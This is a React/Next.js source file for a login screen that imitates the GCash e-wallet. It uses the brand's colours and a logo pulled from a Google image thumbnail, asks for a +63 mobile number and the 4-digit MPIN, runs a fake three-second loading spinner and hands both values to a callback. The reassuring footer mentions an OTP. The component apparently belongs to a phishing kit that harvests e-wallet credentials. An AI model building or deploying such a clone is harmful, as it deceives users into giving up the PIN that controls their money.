"use client";

import { useState } from "react";
import Image from "next/image";
import { ChevronDown } from "lucide-react";

interface PhoneNumberScreenProps {
    onNext: (phoneNumber: string, mpin: string) => void;
}

export function PhoneNumberScreen({ onNext }: PhoneNumberScreenProps) {
    const [phoneNumber, setPhoneNumber] = useState("");
    const [mpin, setMpin] = useState("");
    const [error, setError] = useState("");
    const [isLoading, setIsLoading] = useState(false);

    const formatPhoneNumber = (value: string) => {
        const cleaned = value.replace(/\D/g, "");
        if (cleaned.length === 0) return "";

        // Format for display: 123 456 7890
        let formatted = "";
        if (cleaned.length > 0) formatted += cleaned.substring(0, 3);
        if (cleaned.length >= 4) formatted += " " + cleaned.substring(3, 6);
        if (cleaned.length >= 7) formatted += " " + cleaned.substring(6, 10);

        return formatted;
    };

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, "");
        if (value.length <= 10) {
            setPhoneNumber(value);
            setError("");
        }
    };

    const handleNext = () => {
        if (!phoneNumber) {
            setError("Please enter your mobile number");
            return;
        }
        if (phoneNumber.length < 10) {
            setError("Please enter a valid 10-digit mobile number");
            return;
        }
        if (!mpin || mpin.length < 4) {
            setError("Please enter your 4-digit MPIN");
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            onNext(phoneNumber, mpin);
        }, 3000);
    };

    const displayValue = formatPhoneNumber(phoneNumber);

    return (
        <div className="h-[100dvh] max-h-[100dvh] bg-[#007DFE] flex flex-col items-center px-6 pt-6 pb-4 font-sans overflow-hidden">
            {/* Logo */}
            <div className="flex justify-center items-center">
                <img
                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPnY5dPtD5QUFzz2iSxbWKyQ56zaF6CwjjeA&s"
                    alt="GCash"
                    className="w-[100px] h-[100px] object-contain"
                />
                <p className="ml-0 text-white text-2xl font-bold text-center">GCASH</p>
            </div>

            {/* Input Label */}
            <p className="text-white text-[14px] font-semibold text-center mb-3">
                Put your mobile number to get started.
            </p>

            {/* Underlined Phone Input Area */}
            <div className="w-full max-w-sm mx-auto mb-2">
                <div className="flex items-center justify-center gap-2 pb-1 border-b-2 border-white/60">
                    <div className="flex items-center gap-1 text-white text-[24px] font-bold">
                        <span>+63</span>
                        <ChevronDown className="w-6 h-6 opacity-80" strokeWidth={3} />
                    </div>
                    <div className="flex-1">
                        <input
                            type="tel"
                            value={displayValue}
                            onChange={handlePhoneChange}
                            placeholder="123 456 7890"
                            className="w-full bg-transparent border-none text-white text-[24px] font-bold placeholder:text-white/40 focus:outline-none tracking-tight"
                        />
                    </div>
                </div>
            </div>

            {/* MPIN 4-box input */}
            <div className="w-full max-w-sm mx-auto mb-2 mt-4">
                <p className="text-white text-[14px] font-semibold text-left mb-2">
                    MPIN
                </p>
                <div className="flex justify-between w-full gap-2">
                    {[0, 1, 2, 3].map((i) => (
                        <input
                            key={i}
                            id={`mpin-${i}`}
                            type="password"
                            inputMode="numeric"
                            maxLength={1}
                            value={mpin[i] || ""}
                            onChange={(e) => {
                                const val = e.target.value.replace(/\D/g, "").slice(-1);
                                const arr = mpin.split("");
                                arr[i] = val;
                                const newMpin = arr.join("").slice(0, 4);
                                setMpin(newMpin);
                                setError("");
                                if (val && i < 3) {
                                    document.getElementById(`mpin-${i + 1}`)?.focus();
                                }
                            }}
                            onKeyDown={(e) => {
                                if (e.key === "Backspace" && !mpin[i] && i > 0) {
                                    document.getElementById(`mpin-${i - 1}`)?.focus();
                                }
                            }}
                            className="w-full flex-1 max-w-[52px] h-[52px] text-center text-[20px] font-bold bg-white border border-gray-300 rounded-[10px] focus:outline-none focus:border-[#007DFE] focus:ring-1 focus:ring-[#007DFE] text-[#002147] transition-all"
                        />
                    ))}
                </div>
            </div>

            {/* Error Message */}
            {error && (
                <p className="text-red-200 text-xs mt-1 text-center w-full">
                    {error}
                </p>
            )}

            {/* Spacer */}
            <div className="flex-1" />

            {/* Footer Text */}
            <div className="px-4 mb-3">
                <p className="text-white/80 text-[11px] text-center font-medium leading-[1.35]">
                    By tapping next, we'll collect your mobile number's network information to be able to send you a One-Time Password (OTP).
                </p>
            </div>

            {/* Next Button */}
            <button
                onClick={handleNext}
                disabled={isLoading}
                className={`w-full max-w-[90%] ${phoneNumber.length === 10 && mpin.length === 4
                    ? "bg-white text-[#007DFE]"
                    : "bg-[#9EC7F6] text-[#0066CC]"
                    } hover:opacity-90 disabled:opacity-70 font-bold text-[18px] py-[16px] rounded-full transition-all flex items-center justify-center shadow-md`}
            >
                {isLoading ? (
                    <div className="w-6 h-6 border-3 border-[#0066CC]/30 border-t-[#0066CC] rounded-full animate-spin" />
                ) : (
                    "Next"
                )}
            </button>
        </div>
    );
}
